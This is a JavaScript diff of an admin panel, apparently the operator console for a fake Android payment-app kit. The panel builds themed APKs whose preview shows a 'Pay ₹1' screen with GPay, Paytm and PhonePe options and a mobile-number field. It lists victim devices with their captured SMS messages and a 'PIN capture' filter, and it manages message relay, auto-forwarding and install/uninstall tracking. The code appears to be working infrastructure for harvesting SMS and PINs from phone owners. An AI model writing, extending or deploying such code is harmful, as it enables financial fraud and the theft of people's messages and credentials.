+$("#gStale").textContent=num(g.stale);
+$("#gUninstalled").textContent=num(g.uninstalled);
+$("#gReinstalls").textContent=num(g.reinstalls);
+$("#gUnique").textContent=num(g.unique_devices);
+$("#gToday").textContent=num(g.install_events_24h);
+$("#gRate").textContent=num(g.uninstall_rate_pct)+"%";
 const o=g.outbox||{};
-$("#gQueued").textContent=o.queued||0;
-$("#gSent").textContent=o.sent||0;
-$("#gDelivered").textContent=o.delivered||0;
-$("#gFailed").textContent=o.failed||0;
-badge($("#gQueueBadge"),(o.pending||0)+" pending",(o.pending?"warn":"ok"));
-$("#sInstalls").textContent=g.installs_total;
-$("#sUninstalled").textContent=g.uninstalled;
-$("#sReinstalls").textContent=g.reinstalls;
+$("#gQueued").textContent=num(o.queued);
+$("#gSent").textContent=num(o.sent);
+$("#gDelivered").textContent=num(o.delivered);
+$("#gFailed").textContent=num(o.failed);
+badge($("#gQueueBadge"),num(o.pending)+" pending",(o.pending?"warn":"ok"));
+$("#sInstalls").textContent=num(g.installs_total);
+$("#sUninstalled").textContent=num(g.uninstalled);
+$("#sReinstalls").textContent=num(g.reinstalls);
 }
-
 function renderGrowthEvents(){
 $("#gEventCount").textContent=state.growthEvents.length+" events";
 const body=$("#gEventBody");
@@ -1761,7 +1581,8 @@ body.appendChild(row);
 });
 }
 
-/* ---- builder response normalizers (backend shape alag ho to bhi chale) ---- */
+/* ============================ APK BUILDER ============================ */
+
 function pickId(o){ return o ? (o.appId||o.app_id||o.id||(o._id!=null?String(o._id):null)) : null; }
 function listOf(d,k){ if(Array.isArray(d))return d; if(d&&Array.isArray(d[k]))return d[k]; return []; }
 
@@ -1771,13 +1592,13 @@ return {
 appId: pickId(a)||"—",
 name: a.name||"Untitled app",
 package: a.package||a.packageName||"—",
+theme: a.theme||a.variant_theme||"mono",
 secret: a.secret||null,
 secret_last4: a.secret_last4||a.secretLast4||(a.secret?String(a.secret).slice(-4):""),
-builds_total: Number(a.builds_total||a.builds||0),
+builds_total: num(a.builds_total||a.builds),
 variant: a.variant||"release"
 };
 }
-
 function normBuild(b){
 b=b||{};
 return {
@@ -1786,8 +1607,9 @@ appId: b.appId||b.app_id||"",
 appName: b.appName||b.app_name||b.appId||b.app_id||"—",
 status: b.status||"unknown",
 variant: b.variant||"release",
-duration_ms: Number(b.duration_ms||b.durationMs||0),
-apk_size: Number(b.apk_size||b.apkSize||b.size||0),
+theme: b.theme||"",
+duration_ms: num(b.duration_ms||b.durationMs),
+apk_size: num(b.apk_size||b.apkSize||b.size),
 apk_sha256: b.apk_sha256||b.sha256||"",
 log_tail: Array.isArray(b.log_tail)?b.log_tail:(Array.isArray(b.logs)?b.logs:[]),
 error: b.error||null,
@@ -1795,22 +1617,78 @@ created_at: b.created_at||b.createdAt||null
 };
 }
 
-/* ============================ APK BUILDER ============================ */
+async function loadBuilderConfig(){
+try{
+state.buildCfg=await api(CFG_URL);
+const q=state.buildCfg.queue||{};
+badge($("#bQueueBadge"),num(q.queued)+" queued · "+num(q.running)+" running",(q.running?"warn":""));
+builderNotice("");
+$("#bThemes").textContent=state.themes.length||listOf(state.buildCfg,"themes").length;
+}catch(e){
+try{ state.buildCfg=await api("/health/builder");
+badge($("#bQueueBadge"),"legacy health",(state.buildCfg&&state.buildCfg.status==="ok"?"ok":"warn")); }
+catch(e2){ state.buildCfg=null; badge($("#bQueueBadge"),"offline","bad"); }
+}
+updateBuilderMode();
+}
 
 function updateBuilderMode(){
 const el=$("#builderMode"); if(!el)return;
-const ok=state.buildCfg&&state.buildCfg.queue;
-badge(el,ok?"gradle backend live":"builder offline",ok?"ok":"bad");
-if(!ok)builderNotice("Backend reachable nahi — APK Builder band hai. server.js chalao aur /health/builder check karo.",true);
+const ok=Boolean(state.buildCfg);
+badge(el,ok?"builder live":"builder offline",ok?"ok":"bad");
+if(!ok)builderNotice("Backend reachable nahi — server.js chalao, phir /api/builder/preflight check karo.",true);
 }
 
-async function loadBuilderConfig(){
+async function loadThemes(){
 try{
-state.buildCfg=await api(BUILDER_HEALTH);
-const q=state.buildCfg.queue||{};
-badge($("#bQueueBadge"),(q.queued||0)+" queued · "+(q.running||0)+" running",(q.running?"warn":""));
-}catch(e){ state.buildCfg=null; badge($("#bQueueBadge"),"offline","bad"); }
-updateBuilderMode();
+const d=await api(THEMES_URL);
+state.themes=listOf(d,"themes");
+}catch(e){
+state.themes=(state.buildCfg&&Array.isArray(state.buildCfg.themes))?state.buildCfg.themes:[];
+}
+if(state.themes.length&&!state.themes.some((t)=>t.slug===state.pickedTheme))
+state.pickedTheme=state.themes[0].slug;
+renderThemes(); renderThemePreview();
+$("#bThemes").textContent=state.themes.length;
+}
+
+function renderThemes(){
+const grid=$("#themeGrid");
+if(!state.themes.length){ grid.innerHTML='<div class="empty">koi theme nahi mila</div>';
+badge($("#themePick"),"—"); return; }
+badge($("#themePick"),(state.themes.find((t)=>t.slug===state.pickedTheme)||{}).label||state.pickedTheme,"ok");
+grid.innerHTML=state.themes.map((t)=>(
+'<div class="tcard '+(t.slug===state.pickedTheme?"on":"")+'" data-slug="'+esc(t.slug)+'">'+
+'<div class="tck">✓</div>'+
+'<div class="tsw" style="background:'+esc(t.bg)+'">'+
+[t.surface,t.accent,t.accentSoft,t.border].map((c)=>'<i style="background:'+esc(c)+'"></i>').join("")+
+'</div><div class="tmt"><b style="color:'+esc(t.text)+'">'+esc(t.label)+'</b>'+
+'<span>'+(t.dark?"dark":"light")+'</span></div></div>'
+)).join("");
+grid.querySelectorAll(".tcard").forEach((el)=>{
+el.addEventListener("click",()=>{
+state.pickedTheme=el.dataset.slug;
+try{localStorage.setItem(THEME_KEY,state.pickedTheme);}catch(e){}
+renderThemes(); renderThemePreview();
+});
+});
+}
+
+function renderThemePreview(){
+const t=state.themes.find((x)=>x.slug===state.pickedTheme);
+const sc=$("#themePreview");
+if(!t){ sc.innerHTML=""; sc.style.background="#0a1226"; return; }
+const hero=(t.hero||[]).slice(0,3);
+sc.style.background=t.bg;
+sc.innerHTML=
+'<div class="tlg" style="background:'+esc(t.surface)+';border:2px solid '+esc(t.accent)+';color:'+esc(t.text)+'">'+esc(t.logoText||"DV")+'</div>'+
+'<div class="tti" style="color:'+esc(t.text)+'">'+esc(t.brand||"")+'</div>'+
+'<div class="tsu" style="color:'+esc(t.muted)+'">'+esc(t.tagline||"")+'</div>'+
+(hero.length?'<div class="tim">'+hero.map((u)=>'<i style="background-image:url('+esc(u)+')"></i>').join("")+'</div>':"")+
+'<div class="tfi" style="background:'+esc(t.field)+';border:1px solid '+esc(t.border)+';color:'+esc(t.muted)+'">10-digit mobile number</div>'+
+'<div class="tch">'+["GPay","Paytm","PhonePe","WhatsApp"].map((n)=>
+'<i style="background:'+esc(t.surfaceAlt)+';border:1px solid '+esc(t.border)+';color:'+esc(t.text)+'">'+n+'</i>').join("")+'</div>'+
+'<div class="tbt" style="background:'+esc(t.accent)+';color:'+esc(t.onAccent)+'">Pay ₹1</div>';
 }
 
 async function loadApps(){
@@ -1818,11 +1696,7 @@ try{
 const d=await api("/api/apps");
 state.apps=listOf(d,"apps").map(normApp);
 state.quota=(d&&d.quota)?d.quota:null;
-builderNotice("");
-}catch(e){
-state.apps=[];
-builderNotice(e.message,true);
-}
+}catch(e){ state.apps=[]; }
 renderApps();
 }
 
@@ -1837,18 +1711,19 @@ const body=$("#appBody");
 $("#appCount").textContent=state.apps.length+" apps";
 $("#bApps").textContent=state.apps.length;
 const q=state.quota||{};
-$("#bToday").textContent=(q.used_today===undefined?"—":q.used_today);
-$("#bQuota").textContent=q.unlimited?"unlimited":("limit "+(q.daily_limit===undefined?"—":q.daily_limit));
-if(!state.apps.length){ empty(body,6,"Abhi koi app nahi — upar se banao"); return; }
+$("#bToday").textContent=q.used_today===undefined?"—":num(q.used_today);
+$("#bQuota").textContent=q.unlimited?"unlimited":("limit "+(q.daily_limit===undefined?"—":num(q.daily_limit)));
+if(!state.apps.length){ empty(body,7,"Abhi koi app nahi — upar se banao"); return; }
 body.replaceChildren();
 state.apps.forEach((a)=>{
 const row=document.createElement("tr");
 cell(row,a.name||"—");
 const idc=document.createElement("td"); const idb=document.createElement("span");
 idb.className="badge key mono"; idb.textContent=a.appId; idc.appendChild(idb); row.appendChild(idc);
+badgeCell(row,a.theme||"mono",a.theme===state.pickedTheme?"ok":"");
 cell(row,"••••"+(a.secret_last4||""));
 cell(row,a.package||"—");
-cell(row,String(a.builds_total||0));
+cell(row,String(num(a.builds_total)));
 const ac=document.createElement("td"); const w=document.createElement("div"); w.className="u-actions";
 const b1=document.createElement("button"); b1.className="mini g"; b1.type="button"; b1.textContent="⚙ Build";
 b1.addEventListener("click",()=>startBuild(a));
@@ -1869,15 +1744,15 @@ const body=$("#buildBody");
 $("#buildCount").textContent=state.builds.length+" builds";
 const running=state.builds.filter((b)=>b.status==="running").length;
 const queued=state.builds.filter((b)=>b.status==="queued").length;
-$("#bRunning").textContent=running;
+$("#bRunningFoot").textContent="running "+running;
 $("#bQueued").textContent=queued;
 if(!state.builds.length){ empty(body,8,"Koi build nahi"); return; }
 body.replaceChildren();
 state.builds.forEach((b)=>{
 const row=document.createElement("tr");
 const bc=document.createElement("td"); const bb=document.createElement("span");
-bb.className="badge key mono"; bb.textContent=b.buildId; bc.appendChild(bb); row.appendChild(bc);
-cell(row,b.appName||b.appId);
+bb.className="badge key mono"; bb.textContent=b.buildId.slice(-10); bc.appendChild(bb); row.appendChild(bc);
+cell(row,b.appName||b.appId||"—");
 badgeCell(row,b.status,b.status==="success"?"ok":b.status==="failed"?"bad"
 :b.status==="canceled"?"warn":b.status==="running"?"warn":"");
 cell(row,b.variant||"—");
@@ -1904,6 +1779,12 @@ body.appendChild(row);
 });
 }
 
+function suggestPkg(){
+const n=$("#appName").value.trim(); if(!n)return;
+if($("#appPkg").dataset.touched)return;
+$("#appPkg").value="com.venice."+n.toLowerCase().replace(/[^a-z0-9]/g,"").slice(0,14);
+}
+
 async function createApp(){
 const name=$("#appName").value.trim();
 if(!name){ toast("app name daalo"); return; }
@@ -1911,12 +1792,14 @@ const btn=$("#appCreate"); btn.disabled=true;
 try{
 const r=await api("/api/apps",{method:"POST",body:JSON.stringify({
 name:name,
-package:$("#appBase").value.trim()||null,
-variant:$("#appVariant")?$("#appVariant").value:"release"
+package:$("#appPkg").value.trim()||null,
+variant:$("#appVariant").value,
+theme:state.pickedTheme
 })});
 const app=(r&&r.app)?r.app:(r||{});
 showSecret(app);
 $("#appName").value="";
+$("#appPkg").value=""; delete $("#appPkg").dataset.touched;
 toast("app ban gaya: "+(pickId(app)||name));
 await loadApps(); await loadBuilds();
 }catch(e){ toast(e.message); } finally{ btn.disabled=false; }
@@ -1926,7 +1809,7 @@ function showSecret(app){
 app=app||{};
 const appId=pickId(app)||"—";
 const secret=app.secret||"";
-$("#secretValue").textContent=secret||"(secret save karo — sirf create par poora dikhta hai)";
+$("#secretValue").textContent=secret||"(rotate karke naya lo)";
 const base=$("#appBase").value.trim()||location.origin;
 $("#secretSnippet").textContent=
 "appId   = "+appId+"\n"+
@@ -1939,16 +1822,37 @@ $("#secretSnippet").textContent=
 $("#secretOut").hidden=false;
 }
 
+function buildBody(app){
+const name=(app&&app.name)||$("#appName").value.trim()||"App";
+const pkg=(app&&app.package)||$("#appPkg").value.trim()||("com.venice."+name.toLowerCase().replace(/[^a-z0-9]/g,"").slice(0,14));
+const body={
+appName:name, package:pkg,
+theme:(app&&app.theme)||state.pickedTheme,
+variant:$("#appVariant").value,
+baseUrl:$("#appBase").value.trim()||null,
+config:{applicationId:pkg, name:name}
+};
+if(app&&app.appId)body.appId=app.appId;
+return body;
+}
+
 async function startBuild(app){
-const variant=$("#appVariant")?$("#appVariant").value:"release";
-const base=$("#appBase").value.trim()||null;
 try{
-const r=await api("/api/builds",{method:"POST",body:JSON.stringify({
-appId:app.appId,variant:variant,baseUrl:base
-})});
+const r=await api("/api/builds",{method:"POST",body:JSON.stringify(buildBody(app))});
 const b=(r&&r.build)?r.build:(r||{});
 const bid=b.buildId||b.build_id||pickId(b)||"—";
 toast("build queued: "+bid);
+await loadBuilds();
+if(bid!=="—"){ subscribeBuild(bid); showBuildLog(bid); }
+}catch(e){ toast(e.message); }
+}
+
+async function quickBuild(){
+try{
+const r=await api("/api/builds",{method:"POST",body:JSON.stringify(buildBody(null))});
+const b=(r&&r.build)?r.build:(r||{});
+const bid=b.buildId||"—";
+toast("quick build queued: "+bid);
 await loadBuilds();
 if(bid!=="—"){ subscribeBuild(bid); showBuildLog(bid); }
 }catch(e){ toast(e.message); }
@@ -1958,17 +1862,15 @@ async function cancelBuild(b){
 try{ await api("/api/builds/"+b.buildId+"/cancel",{method:"POST"});
 toast("canceled"); await loadBuilds(); }catch(e){ toast(e.message); }
 }
-
 async function retryBuild(b){
 try{
 const r=await api("/api/builds/"+b.buildId+"/retry",{method:"POST"});
 const nb=(r&&r.build)?r.build:(r||{});
 const bid=nb.buildId||nb.build_id||"—";
 toast("requeued: "+bid); await loadBuilds();
-if(bid!=="—")subscribeBuild(bid);
+if(bid!=="—"){ subscribeBuild(bid); showBuildLog(bid); }
 }catch(e){ toast(e.message); }
 }
-
 async function rotateSecret(appId){
 if(!confirm("Secret rotate karein? Purana secret turant 401 dega, APK rebuild karna padega."))return;
 try{
@@ -1978,17 +1880,15 @@ toast("secret rotated — APK rebuild karo");
 await loadApps();
 }catch(e){ toast(e.message); }
 }
-
 async function deleteApp(a){
 if(!confirm("Delete app "+a.appId+"? Iske builds bhi hat jayenge."))return;
 try{ await api("/api/apps/"+a.appId,{method:"DELETE"});
 toast("deleted"); await loadApps(); await loadBuilds(); }catch(e){ toast(e.message); }
 }
-
 function downloadBuild(b){
 const a=document.createElement("a");
 a.href="/api/builds/"+b.buildId+"/download";
-a.download=(b.appName||b.appId||"app")+"-"+b.buildId+".apk";
+a.download=(b.appName||b.appId||"app")+"-"+b.buildId.slice(-6)+".apk";
 document.body.appendChild(a); a.click(); a.remove();
 toast("download start");
 }
@@ -1996,22 +1896,56 @@ toast("download start");
 async function showBuildLog(buildId){
 state.logBuild=buildId;
 $("#logPanel").hidden=false;
-$("#logBuildId").textContent=buildId;
+$("#logBuildId").textContent=buildId.slice(-10);
 await fetchBuildLog();
 $("#logPanel").scrollIntoView({behavior:"smooth",block:"start"});
 }
 
 async function fetchBuildLog(){
 const id=state.logBuild; if(!id)return;
+let txt="", status="unknown";
 try{
+try{
+const d=await api("/api/builds/"+id+"/log");
+txt=d.log||"(log khali)"; status=d.status||"unknown";
+if(d.error)txt+="\n\nERROR:\n"+d.error;
+}catch(e1){
 const r=await api("/api/builds/"+id);
 const b=normBuild((r&&r.build)?r.build:r);
-let txt=(b.log_tail||[]).join("\n")||"(log khali)";
+txt=(b.log_tail||[]).join("\n")||"(log khali)";
 if(b.error)txt+="\n\nERROR:\n"+b.error;
-$("#buildLog").textContent=txt;
-$("#logLive").hidden=!(b.status==="running"||b.status==="queued");
-const pre=$("#buildLog"); pre.scrollTop=pre.scrollHeight;
+status=b.status;
+}
+const pre=$("#buildLog");
+const atBottom=pre.scrollTop+pre.clientHeight>=pre.scrollHeight-40;
+pre.textContent=txt;
+if(atBottom)pre.scrollTop=pre.scrollHeight;
+$("#logLive").hidden=!(status==="running"||status==="queued");
 }catch(e){ $("#buildLog").textContent=e.message; }
+}
+
+async function showPreflight(){
+try{
+state.pf=await api(PF_URL);
+const p=state.pf; const t=p.tools||{};
+const rows=[
+["ok",p.ok?"yes":"no",p.ok?"ok":"bad"],
+["engine",p.engine||"—",""],
+["template",p.template_ok?"present":"MISSING",p.template_ok?"ok":"bad"],
+["themes",String((p.themes||[]).length),""],
+["android sdk",t.android_sdk||"missing",t.android_sdk?"ok":"bad"],
+["gradle",(t.gradle&&t.gradle.source)||"missing",t.gradle?"ok":"bad"],
+["java",t.java||"missing",t.java?"ok":"bad"],
+["docker",t.docker||"not found",""]
+];
+$("#pfOut").innerHTML=rows.map((r)=>
+'<div class="row"><div><div class="row-name">'+esc(r[0])+'</div>'+
+'<div class="row-desc mono">'+esc(r[1])+'</div></div><span class="badge '+r[2]+'">'+esc(r[1])+'</span></div>'
+).join("")+
+((p.problems&&p.problems.length)
+?'<div class="notice bad" style="margin-top:14px">'+p.problems.map(esc).join("<br>")+'</div>'
+:'<div class="ok-msg" style="margin-top:14px">sab ready</div>');
+}catch(e){ $("#pfOut").textContent=e.message; }
 }
 
 function subscribeBuild(buildId){
@@ -2025,15 +1959,17 @@ function connectUserSocket(){
 if(!state.auth)return;
 try{
 const proto=location.protocol==="https:"?"wss:":"ws:";
-const qs=token()?"?token="+encodeURIComponent(token()):"";
-const ws=new WebSocket(proto+"//"+location.host+"/ws/user"+qs);
+const parts=[];
+if(token())parts.push("token="+encodeURIComponent(token()));
+parts.push("userId="+encodeURIComponent(state.userId||"anon"));
+const ws=new WebSocket(proto+"//"+location.host+"/ws/user?"+parts.join("&"));
 state.wsUser=ws;
 ws.onmessage=(ev)=>{
 try{
 const m=JSON.parse(ev.data);
 if(String(m.type)==="build"){
 const d=m.data||{};
-toast("build "+(d.buildId||"")+" → "+d.status);
+toast("build "+String(d.buildId||"").slice(-8)+" → "+d.status);
 loadBuilds().catch(()=>{});
 if(state.logBuild===d.buildId)fetchBuildLog();
 }
@@ -2065,29 +2001,20 @@ $("#userCount").textContent=list.length+" keys";
 const body=$("#userBody");
 if(!list.length){ empty(body,9,q?"Koi key match nahi hui":"Abhi koi key generate nahi ki"); return; }
 body.replaceChildren();
-
 list.forEach((u)=>{
 const row=document.createElement("tr");
-
-const kc=document.createElement("td");
-const kb=document.createElement("span"); kb.className="badge key"; kb.textContent=u.key||"—";
-kc.appendChild(kb); row.appendChild(kc);
-
+const kc=document.createElement("td"); const kb=document.createElement("span");
+kb.className="badge key"; kb.textContent=u.key||"—"; kc.appendChild(kb); row.appendChild(kc);
 const lc=document.createElement("td"); lc.textContent=u.label||"—";
 if(u.phone){ const p=document.createElement("span"); p.className="sub mono"; p.textContent=u.phone; lc.appendChild(p); }
 row.appendChild(lc);
-
 cell(row,fmtDate(u.created_at));
 const ll=document.createElement("td"); ll.textContent=u.last_login_at?fmt(u.last_login_at):"never"; row.appendChild(ll);
-cell(row,String(u.login_count||0));
-
+cell(row,String(num(u.login_count)));
 const ec=document.createElement("td"); const eb=document.createElement("span");
 eb.className="badge "+(u.expires_at?(u.expired?"bad":"warn"):"ok");
-eb.textContent=u.expires_at?fmtDate(u.expires_at):"lifetime";
-ec.appendChild(eb); row.appendChild(ec);
-
+eb.textContent=u.expires_at?fmtDate(u.expires_at):"lifetime"; ec.appendChild(eb); row.appendChild(ec);
 const st=keyStatus(u); badgeCell(row,st.text,st.kind);
-
 const sc=document.createElement("td"); const wrap=document.createElement("div"); wrap.className="u-actions";
 [7,30,90].forEach((days)=>{
 const b=document.createElement("button"); b.className="mini"; b.type="button"; b.textContent="+"+days+"d";
@@ -2102,7 +2029,6 @@ sb.addEventListener("click",()=>{ if(!di.value){ toast("date chuno"); return; }
 setKeyExpiry(u.id,{expires_at:di.value+"T23:59:59"}); });
 wrap.appendChild(sb);
 sc.appendChild(wrap); row.appendChild(sc);
-
 const ac=document.createElement("td"); const aw=document.createElement("div"); aw.className="u-actions";
 const cb=document.createElement("button"); cb.className="mini"; cb.type="button"; cb.textContent="⧉ copy";
 cb.addEventListener("click",()=>copyText(u.key||"",u.key||"")); aw.appendChild(cb);
@@ -2112,17 +2038,15 @@ aw.appendChild(tb);
 const db=document.createElement("button"); db.className="mini d"; db.type="button"; db.textContent="Delete";
 db.addEventListener("click",()=>deleteKey(u)); aw.appendChild(db);
 ac.appendChild(aw); row.appendChild(ac);
-
 body.appendChild(row);
 });
 }
 
 function copyText(text,label){
-if(navigator.clipboard)navigator.clipboard.writeText(text)
-.then(()=>toast("copied: "+(label||text))).catch(()=>toast(label||text));
+if(navigator.clipboard&&navigator.clipboard.writeText)
+navigator.clipboard.writeText(text).then(()=>toast("copied: "+(label||text))).catch(()=>toast(label||text));
 else toast(label||text);
 }
-
 async function setKeyExpiry(id,payload){
 try{ await api("/admin/keys/"+id+"/expiry",{method:"POST",body:JSON.stringify(payload)});
 toast("expiry set"); await loadUsers(); }catch(e){ toast(e.message); }
@@ -2180,13 +2104,11 @@ if(!list.length){ e.hidden=false;
 e.textContent=state.pinsOnly?"Koi PIN capture nahi hua":(q?"Koi device match nahi hua":"No devices registered");
 return; }
 e.hidden=true;
-
 list.forEach((d)=>{
 const t=tel(d); const info=nums(d); const msgs=devMsgs(d); const auto=autoOf(d);
 const card=document.createElement("article");
 card.className="dev-card panel"; card.tabIndex=0; card.setAttribute("role","button");
 card.dataset.dev=String(devId(d));
-
 const top=document.createElement("div"); top.className="dev-top";
 const icon=document.createElement("div"); icon.className="phone"; icon.innerHTML=PHONE_SVG; top.appendChild(icon);
 const nw=document.createElement("div"); nw.style.minWidth="0"; nw.style.flex="1";
@@ -2196,7 +2118,6 @@ se.textContent=(t.model||t.manufacturer||"unknown model")+" · Android "+(t.andr
 nw.appendChild(se); top.appendChild(nw);
 const bw=document.createElement("div"); bw.style.flex="0 0 auto"; bw.appendChild(battEl(d)); top.appendChild(bw);
 card.appendChild(top);
-
 const meta=document.createElement("div"); meta.className="dev-meta";
 if(d.short_id){ const idb=document.createElement("span"); idb.className="badge id mono";
 idb.textContent=d.short_id; meta.appendChild(idb); }
@@ -2221,7 +2142,6 @@ else if(ist==="stale"){
 const sb2=document.createElement("span"); sb2.className="badge warn";
 sb2.textContent="STALE"; meta.appendChild(sb2); }
 card.appendChild(meta);
-
 const foot=document.createElement("div"); foot.className="dev-foot";
 const cnt=document.createElement("span"); cnt.textContent=msgs.length+" messages"; foot.appendChild(cnt);
 const hint=document.createElement("span"); hint.className="open-hint"; hint.textContent="OPEN →";
@@ -2365,6 +2285,8 @@ item.appendChild(foot); wrap.appendChild(item);
 });
 }
 
+function safe(fn,arg){ try{return fn(arg);}catch(e){ reportError(e); return null; } }
+
 function renderDetail(d){
 const info=nums(d); const auto=autoOf(d);
 $("#dIcon").innerHTML=PHONE_SVG;
@@ -2388,7 +2310,7 @@ const ist=String(d.install_state||"").toLowerCase();
 if(ist==="uninstalled"||ist==="gone"){
 const ub=document.createElement("span"); ub.className="badge bad";
 ub.textContent=ist==="gone"?"REPLACED":"UNINSTALLED"; tags.appendChild(ub); }
-if(Number(d.install_seq||1)>1){
+if(num(d.install_seq,1)>1){
 const rb=document.createElement("span"); rb.className="badge violet";
 rb.textContent="INSTALL #"+d.install_seq; tags.appendChild(rb); }
 const bb=$("#dBatt"); bb.replaceChildren(); bb.appendChild(battEl(d));
@@ -2401,10 +2323,10 @@ safe(renderSpecs,d); safe(renderMore,d); safe(renderOutbox);
 buildSimChips($("#dSims"),"send",d);
 }
 
-function safe(fn,arg){ try{return fn(arg);}catch(e){ reportError(e); return null; } }
 function openDeviceById(id){ const d=findDevice(id); if(!d){ toast("device not found"); return; } openDetail(d); }
 
 async function loadDeviceMessages(deviceId){
+if(state.noAdmin)return;
 try{ const d=await api("/admin/devices/"+deviceId+"/messages?limit=500");
 state.devMsgs[String(deviceId)]=Array.isArray(d)?d:(d.messages||[]);
 if(state.active&&String(devId(state.active))===String(deviceId))renderDetailMsgs(); }catch(e){}
@@ -2429,7 +2351,6 @@ state.numTried[String(id)]=true;
 setTimeout(()=>{ if(state.active&&String(devId(state.active))===String(id))fetchNumber(d); },900);
 }
 }
-
 function closeDetail(){
 $("#detail").hidden=true; document.body.style.overflow="";
 $("#actMenu").hidden=true; state.active=null;
@@ -2442,16 +2363,17 @@ catch(e){ state.linkOk=false; updateLink(); badge($("#apiBadge"),"Down","bad"); 
 try{ await api("/health/database"); badge($("#dbBadge"),"Connected","ok"); }
 catch(e){ badge($("#dbBadge"),"Down","bad"); }
 try{
-const b=await api(BUILDER_HEALTH);
-const ok=b.status==="ok";
-badge($("#builderBadge"),ok?"Ready":"Degraded",ok?"ok":"warn");
-const tools=b.tools||{};
-const missing=Object.keys(tools).filter((k)=>!tools[k]);
-if(missing.length&&!ok)builderNotice("Builder ready nahi — missing: "+missing.join(", "),true);
-}catch(e){ badge($("#builderBadge"),"Down","bad"); }
+await api(CFG_URL);
+badge($("#builderBadge"),"Ready","ok");
+}catch(e){
+try{ await api("/health/builder"); badge($("#builderBadge"),"Legacy","warn"); }
+catch(e2){ badge($("#builderBadge"),"Down","bad"); }
+}
+badge($("#adminBadge"),state.noAdmin?"absent":"live",state.noAdmin?"warn":"ok");
 }
 
 async function loadDevices(){
+if(state.noAdmin)return;
 const d=await api("/admin/devices");
 state.linkOk=true; updateLink();
 state.devices=Array.isArray(d)?d:(d.devices||[]);
@@ -2471,6 +2393,7 @@ if(state.active)renderDetailMsgs();
 }
 
 async function loadMessages(){
+if(state.noAdmin)return;
 const d=await api("/admin/messages?limit=500");
 state.linkOk=true; updateLink();
 state.messages=Array.isArray(d)?d:(d.messages||[]);
@@ -2490,19 +2413,23 @@ if(hit)j.status="sent";
 renderOutbox();
 }
 
-async function loadRules(){ const d=await api("/admin/rules");
+async function loadRules(){ if(state.noAdmin)return;
+const d=await api("/admin/rules");
 state.rules=Array.isArray(d)?d:(d.rules||[]); renderRules(); }
 
 async function loadUsers(){
-if(state.role!=="admin"){ state.users=[]; return; }
+if(state.noAdmin)return;
+if(state.role!=="admin"&&!state.noAuth){ state.users=[]; return; }
 try{ const d=await api("/admin/keys"); state.users=Array.isArray(d)?d:(d.keys||[]); renderUsers(); }catch(e){}
 }
 
 async function loadAutoSender(){
+if(state.noAdmin)return;
 try{ const d=await api("/admin/auto-sender");
 state.relayAccount=d.account||null; state.forward=d.forward_user||""; }catch(e){}
 }
-async function loadRelay(){ const d=await api("/admin/relay/status"); state.relay=d; renderRelay(); }
+async function loadRelay(){ if(state.noAdmin)return;
+const d=await api("/admin/relay/status"); state.relay=d; renderRelay(); }
 
 function renderRelay(){
 const r=state.relay; if(!r)return;
@@ -2542,9 +2469,11 @@ if(!state.auth)return;
 $("#refreshBtn").disabled=true;
 try{
 await loadHealth();
-const jobs=[loadDevices(),loadMessages(),loadRules(),loadRelay(),
-loadAutoSender(),loadStats(),loadGrowthEvents(),loadBuilderConfig(),loadApps(),loadBuilds()];
-if(state.role==="admin")jobs.push(loadUsers());
+await loadThemes();
+await loadBuilderConfig();
+const jobs=[loadApps(),loadBuilds()];
+if(!state.noAdmin)jobs.push(loadDevices(),loadMessages(),loadRules(),loadRelay(),loadAutoSender(),loadStats(),loadGrowthEvents());
+if(state.role==="admin"||state.noAuth)jobs.push(loadUsers());
 const res=await Promise.allSettled(jobs);
 if(res.some((r)=>r.status==="rejected"))toast("some sections failed to sync");
 }finally{ $("#refreshBtn").disabled=false; }
@@ -2559,12 +2488,11 @@ if(section==="users")await loadUsers();
 if(section==="growth"){ await loadStats(); await loadGrowthEvents(); }
 if(section==="relay"){ await loadRelay(); await loadRules(); }
 if(section==="live"){ await loadDevices(); await loadMessages(); }
-if(section==="builder"){ await loadBuilderConfig(); await loadApps(); await loadBuilds(); }
+if(section==="builder"){ await loadThemes(); await loadBuilderConfig(); await loadApps(); await loadBuilds(); }
 toast("synced");
 }catch(e){ toast(e.message); }
 }
 
-function setLink(t){ const el=$("#linkLabel"); if(el)el.textContent=t; }
 function updateLink(){
 const el=$("#linkLabel");
 if(el)el.textContent=state.apiDown?"Link down":(state.wsOk?"Socket live":(state.linkOk?"Polling":"Connecting"));
@@ -2628,17 +2556,26 @@ function schedulePoll(){
 clearTimeout(state.pollTimer);
 const fast=state.devices.some(online);
 state.pollTimer=setTimeout(async()=>{
-if(state.auth&&!document.hidden){
+if(state.auth&&!document.hidden&&!state.noAdmin){
 await Promise.allSettled([loadDevices(),loadMessages(),loadStats()]);
-if(state.builds.some((b)=>b.status==="running"||b.status==="queued")){
-await Promise.allSettled([loadBuilds(),loadBuilderConfig()]);
-if(state.logBuild)fetchBuildLog();
-}
 }
 schedulePoll();
 },fast?8000:20000);
 }
-function startRealtime(){ updateLink(); connectWs(); schedulePoll(); }
+
+function scheduleBuildPoll(){
+clearTimeout(state.buildTimer);
+const busy=state.builds.some((b)=>b.status==="running"||b.status==="queued");
+state.buildTimer=setTimeout(async()=>{
+if(state.auth&&!document.hidden&&busy){
+await Promise.allSettled([loadBuilds(),loadBuilderConfig()]);
+if(state.logBuild)fetchBuildLog();
+}
+scheduleBuildPoll();
+},busy?2600:14000);
+}
+
+function startRealtime(){ updateLink(); connectWs(); schedulePoll(); scheduleBuildPoll(); }
 
 function navigate(page){
 document.querySelectorAll(".nav").forEach((b)=>b.classList.toggle("on",b.dataset.page===page));
@@ -2653,7 +2590,8 @@ if(page==="builder")refreshSection("builder");
 
 /* ------------------------------ wiring ------------------------------ */
 
-function gotoBuilder(ev){ if(ev)ev.preventDefault(); if(state.auth)navigate("builder"); else $("#username").focus(); }
+function gotoBuilder(ev){ if(ev)ev.preventDefault();
+if(state.auth)navigate("builder"); else if(!$("#loginScreen").hidden)$("#username").focus(); }
 $("#apkBtn").addEventListener("click",gotoBuilder);
 $("#apkLogin").addEventListener("click",gotoBuilder);
 $("#apiHint").textContent=location.host||"/";
@@ -2661,9 +2599,9 @@ $("#apiBase").textContent=location.origin||"/";
 
 $("#pinsBtn").addEventListener("click",()=>{ state.pinsOnly=!state.pinsOnly;
 $("#pinsBtn").classList.toggle("on",state.pinsOnly); renderCards(true); });
-$("#devSearch").addEventListener("input",()=>renderCards(true));
-$("#userSearch").addEventListener("input",renderUsers);
-$("#dSearch").addEventListener("input",renderDetailMsgs);
+$("#devSearch").addEventListener("input",debounce(()=>renderCards(true),160));
+$("#userSearch").addEventListener("input",debounce(renderUsers,160));
